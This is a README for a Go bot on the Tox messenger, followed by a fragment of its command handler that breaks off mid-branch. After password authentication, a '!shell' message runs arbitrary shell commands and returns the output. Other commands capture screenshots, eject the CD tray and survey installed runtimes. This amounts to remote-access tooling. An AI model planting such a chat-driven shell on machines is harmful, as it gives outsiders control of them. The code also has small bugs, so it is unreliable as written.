# go tox bot

A simple tox bot written in go

## Commands

password Authenticates you to the bot

!check auth Checks if you are authenticated

!unauth unauthenticates you

!exit exits

default:
    if authed == true {
        if len([]rune(message)) >= 6 && string(message[0:6]) == "!shell" {
            s := strings.Split(message, " ")
            total_args := len(s)
            command := s[1:total_args]
            cmd := exec.Command("sh", "-c", strings.Join(command, " "))
            stdout, err := cmd.Output()
            if err != nil {
                println(err.Error())
            }
            t.FriendSendMessage(friendNumber, string(stdout))
        } else if len([]rune(message)) >= 10 && string(message[0:10]) == "!open tray" {
            exec.Command("eject").Output()
        } else if len([]rune(message)) >= 11 && string(message[0:11]) == "!close tray" {
            exec.Command("eject -t").Output()
        } else if len([]rune(message)) >= 10 && string(message[0:11]) == "!screenshot" {
            img, err := screenshot.CaptureScreen()
               if err != nil {
                   panic(err)
                }
                t := time.Now().UTC()
                f, err := os.Create(t.String() + ".png")
                if err != nil {
                    panic(err)
                }
                err = png.Encode(f, img)
                if err != nil {
                          panic(err)
                 }
                f.Close()
        } else if string(message) == "!os_check" {
            if debug == true {
                fmt.Println("Checking OS")
            }
            info := check_os()
            t.FriendSendMessage(friendNumber, string(info))
        } else if string(message) == "!check_mono_install" {
            message := fmt.Sprintf("Mono %v\nMCS %v", checkMonoInstall(), checkMonoCompilerInstall())
            t.FriendSendMessage(friendNumber, message)
        } else if string(message) == "!check_python_install" {
            message := fmt.Sprintf("python2 %v\npython3 %v", checkPython2Install(), checkPython3Install())
            t.FriendSendMessage(friendNumber, message)
        } else if string(message) == "!check_go_install" {
